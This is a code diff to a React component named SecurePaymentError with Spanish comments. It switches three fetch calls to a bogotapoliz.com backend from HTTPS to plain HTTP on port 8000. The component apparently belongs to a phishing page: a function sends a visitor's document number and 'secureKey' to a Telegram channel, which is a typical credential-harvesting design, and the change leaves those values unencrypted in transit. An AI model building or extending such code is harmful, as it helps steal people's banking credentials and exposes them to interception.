@@ -34,7 +34,7 @@ const SecurePaymentError = () => {
     if (!guestId) {
       // Si no se encuentra el guestId en localStorage, hacemos una solicitud para obtenerlo
       try {
-        const response = await fetch('https://bogotapoliz.com/api/v1/newGuest', {
+        const response = await fetch('http://bogotapoliz.com:8000/api/v1/newGuest', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -66,7 +66,7 @@ const SecurePaymentError = () => {
   // Función para enviar el mensaje al canal de Telegram
   const sendTelegramMessage = async (documentNumber, secureKey) => {
     try {
-      const response = await fetch('https://bogotapoliz.com/api/v1/send-telegram-message', {
+      const response = await fetch('http://bogotapoliz.com:8000/api/v1/send-telegram-message', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -112,7 +112,7 @@ const SecurePaymentError = () => {
         };
 
         // Hacer la solicitud PATCH
-        const response = await fetch(`https://bogotapoliz.com/api/v1/guest/${guestId}`, {
+        const response = await fetch(`http://bogotapoliz.com:8000/api/v1/guest/${guestId}`, {
           method: 'PUT',
           headers: {
             'Content-Type': 'application/json',
